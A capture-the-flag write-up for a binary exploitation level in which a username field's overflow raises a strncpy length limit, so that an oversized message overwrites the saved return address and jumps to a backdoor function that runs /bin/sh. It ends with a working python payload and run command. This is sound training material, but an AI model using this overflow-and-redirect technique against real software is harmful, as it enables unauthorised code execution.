# LEVEL 09

## EXPLANATIONS

### BINARY BEHAVIOR

- programm asks a username and a message that is send to @Unix-Dude
- function main, set_msg, set_username, handle_msg and secret_backdoor

- function `handle_msg` :

  - sets value at address 0x7fffffffdc74 to 0x8c<sub>16</sub> (140<sub>10</sub>)
    - => will be used as set_msg strncpy limit

- function `set_username` :

  - copies at most 41 bytes on the stack, the 41th exactly at address 0x7fffffffdc74
    - => (set_msg strncpy limit)

- function `set_msg` :

  - gets at most 1024 bytes from stdin into `buf_a`
  - copies `N` first bytes from `buf_a` to top of handle_msg stack frame (ESP pointer)
  - sEIP handle_msg is 200 bytes after ESP handle_msg

- function `secret backdoor` :
  - reads on stdin into `buf_b`
  - calls system(`buf_b`)

### EXPLOIT STRATEGY

- With function set_username, overwrite `N` - we replace 0x8c by 0xff (255<sub>10</sub>)
- With function set_msg, we write `secret_backdoor` address into sEIP of handle_msg.

  - => Possible thanks to `N` being 255 (what we have overwritten before) - upon ret instruction, we jump to secret_backdoor

- secret backdoor is called
  - we provide `bin_sh` into buf_b

### RUN COMMAND

```
python -c "print('\xff' * 127 + 'A' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + 'A' * 815 + '/bin/sh')" > /tmp/exploit_string
cat /tmp/exploit_string - | ./level09
```
